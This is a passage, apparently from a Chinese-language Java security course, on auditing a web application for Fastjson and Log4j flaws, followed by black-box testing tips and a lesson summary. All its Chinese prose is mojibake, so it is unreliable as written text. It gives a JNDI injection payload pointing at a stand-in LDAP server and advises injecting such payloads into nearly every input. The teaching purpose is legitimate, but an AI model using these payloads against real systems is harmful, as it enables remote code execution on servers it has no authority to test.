    *   **æ¼æ´éªŒè¯**ï¼šåœ¨åå°â€œæ·»åŠ äº§å“â€åŠŸèƒ½å¤„æŠ“åŒ…ï¼Œå°†è¯·æ±‚ä¸­çš„JSONå‚æ•°æ›¿æ¢ä¸ºåŒ…å«JNDI Payloadçš„æ¶æ„JSONå­—ç¬¦ä¸²ã€‚å¯åŠ¨JNDIåˆ©ç”¨å·¥å…·ç›‘å¬ï¼Œè§‚å¯Ÿåˆ°å·¥å…·æ”¶åˆ°è¯·æ±‚å¹¶æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼ˆå¦‚å¼¹å‡ºè®¡ç®—å™¨ï¼‰ï¼ŒéªŒè¯æ¼æ´å­˜åœ¨ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_315.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_317.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_319.png)

2.  **å‘ç°Log4jæ¼æ´**
    *   **ä»£ç å®šä½**ï¼šå…¨å±€æœç´¢`log.info`ã€`log.error`ï¼Œå‘ç°`AdminController`ä¸­çš„æ–‡ä»¶ä¸Šä¼ æ–¹æ³•é‡Œï¼Œæœ‰`log.info(â€œè·å–æ–‡ä»¶åï¼šâ€ + fileName)`çš„è¯­å¥ï¼Œä¸”`fileName`æ¥è‡ªç”¨æˆ·å¯æ§çš„ä¸Šä¼ æ–‡ä»¶åã€‚
    *   **ç‰ˆæœ¬ç¡®è®¤**ï¼šæŸ¥çœ‹`pom.xml`ï¼Œç¡®è®¤Log4jç‰ˆæœ¬ä¸º1.xï¼Œå­˜åœ¨æ¼æ´é£é™©ï¼ˆå®é™…Log4Shellä¸»è¦å½±å“Log4j2ï¼Œä½†Log4j1.xä¹Ÿæœ‰å…¶ä»–é—®é¢˜ï¼Œæ­¤å¤„ä»…ä½œæ¼”ç¤ºæ€è·¯ï¼‰ã€‚
    *   **æ¼æ´éªŒè¯**ï¼šåœ¨åå°â€œä¸Šä¼ ç®¡ç†å‘˜å¤´åƒâ€åŠŸèƒ½å¤„ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶åæ”¹ä¸ºJNDI Payloadï¼ˆå¦‚`${jndi:ldap://your-ldap-server/exp}`ï¼‰ã€‚æäº¤åï¼Œè§‚å¯ŸJNDIå·¥å…·æ˜¯å¦æ”¶åˆ°è¯·æ±‚ã€‚**æ³¨æ„**ï¼šæ­¤æ¼æ´èƒ½å¦æˆåŠŸåˆ©ç”¨ï¼Œé«˜åº¦ä¾èµ–äºæœåŠ¡å™¨è¿è¡Œçš„JDKç‰ˆæœ¬ï¼ˆéœ€ä½äºé™åˆ¶ç‰ˆæœ¬ï¼‰ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_321.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_323.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_325.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_327.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_329.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_331.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_333.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_335.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_337.png)

**å®¡è®¡æŠ€å·§æ€»ç»“ï¼š**
*   **ç™½ç›’å®¡è®¡**ï¼šç›´æ¥æœç´¢å±é™©å‡½æ•°ï¼ˆå¦‚`Runtime.exec`ï¼‰ã€å±é™©ç±»åº“ï¼ˆå¦‚`fastjson`ã€`shiro`ï¼‰çš„APIè°ƒç”¨ç‚¹ï¼Œå¹¶è¿½æº¯è¾“å…¥å‚æ•°æ˜¯å¦å¯æ§ã€‚
*   **é»‘ç›’æµ‹è¯•**ï¼š
    *   **Shiro**ï¼šå¯»æ‰¾ç™»å½•åŠŸèƒ½ï¼Œæ£€æŸ¥Cookieä¸­æ˜¯å¦æœ‰`rememberMe`å­—æ®µã€‚
    *   **Fastjson/Jackson**ï¼šå¯»æ‰¾æ¥æ”¶JSONæ•°æ®çš„åŠŸèƒ½ç‚¹ï¼ˆå¦‚APIæ¥å£ï¼‰ï¼Œå°è¯•æ’å…¥Payloadã€‚
    *   **XStream**ï¼šå¯»æ‰¾æ¥æ”¶XMLæ•°æ®çš„åŠŸèƒ½ç‚¹ã€‚
    *   **Log4j**ï¼šå‡ ä¹åœ¨æ‰€æœ‰è¾“å…¥ç‚¹å°è¯•æ’å…¥JNDI Payloadè¿›è¡Œâ€œç›²æ‰“â€ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_339.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_341.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_343.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_345.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_347.png)

## æ€»ç»“ä¸ä¸‹èŠ‚é¢„å‘Š ğŸ“š

![](img/2bad90e2b256ef869fe1e32e14f7beeb_349.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Javaå®‰å…¨çš„ä¸‰ä¸ªé‡è¦éƒ¨åˆ†ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_351.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_353.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_355.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_357.png)

é¦–å…ˆï¼Œæˆ‘ä»¬å›é¡¾äº†Javaä¸­å®ç°åŸç”Ÿå‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªæ ¸å¿ƒç±»å’Œæ–¹æ³•ï¼Œå¦‚`Runtime.exec()`å’Œ`ProcessBuilder`ï¼Œè¿™æ˜¯ç†è§£åç»­æ¼æ´åˆ©ç”¨çš„åŸºç¡€ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_359.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_361.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_363.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_365.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_367.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_369.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_371.png)

å…¶æ¬¡ï¼Œæˆ‘ä»¬æ·±å…¥æ¢è®¨äº†**JNDIæ³¨å…¥**ã€‚æ˜ç¡®äº†JNDIæœ¬èº«æ˜¯ä¸€é¡¹JavaæŠ€æœ¯ï¼Œä½†ç»“åˆRMIæˆ–LDAPåè®®æ—¶ï¼Œå¯èƒ½æˆä¸ºå¯¼è‡´RCEçš„åˆ©ç”¨é€šé“ã€‚æˆ‘ä»¬äº†è§£äº†å…¶åˆ©ç”¨æ–¹å¼ã€å·¥å…·ä»¥åŠé«˜ç‰ˆæœ¬JDKçš„é™åˆ¶ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_373.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_375.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_377.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_378.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_380.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_382.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_384.png)

æœ€åï¼Œä¹Ÿæ˜¯æœ¬èŠ‚è¯¾çš„æ ¸å¿ƒï¼Œæˆ‘ä»¬ç³»ç»Ÿæ€§åœ°å­¦ä¹ äº†**Javaäº”å¤§ä¸å®‰å…¨ç»„ä»¶**ï¼šFastjsonã€Jacksonã€Shiroã€XStreamå’ŒLog4jã€‚æˆ‘ä»¬åˆ†æäº†æ¯ä¸ªç»„ä»¶çš„ä½œç”¨ã€æ¼æ´åŸç†ã€é»‘ç›’è¯†åˆ«ç‰¹å¾ï¼Œå¹¶ç†è§£äº†å®ƒä»¬å¦‚ä½•å¸¸å¸¸ä¸JNDIç»“åˆè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é€šè¿‡ä¸€ä¸ªå®æˆ˜ä»£ç å®¡è®¡æ¡ˆä¾‹ï¼Œæˆ‘ä»¬æ¼”ç¤ºäº†å¦‚ä½•å‘ç°å’ŒéªŒè¯FastjsonåŠLog4jç›¸å…³çš„æ¼æ´ç‚¹ã€‚

![](img/2bad90e2b256ef869fe1e32e14f7beeb_386.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_388.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_390.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_392.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_394.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_396.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_398.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_400.png)

![](img/2bad90e2b256ef869fe1e32e14f7beeb_402.png)

ä¸‹èŠ‚è¯¾ï¼Œæˆ‘ä»¬å°†ç»§ç»­æ·±å…¥Javaå®‰å…¨é¢†åŸŸï¼Œå­¦ä¹ Javaæ¡†æ¶æ¼æ´ä»¥åŠååºåˆ—åŒ–æ¼æ´çš„æ›´æ·±å±‚çŸ¥è¯†ã€‚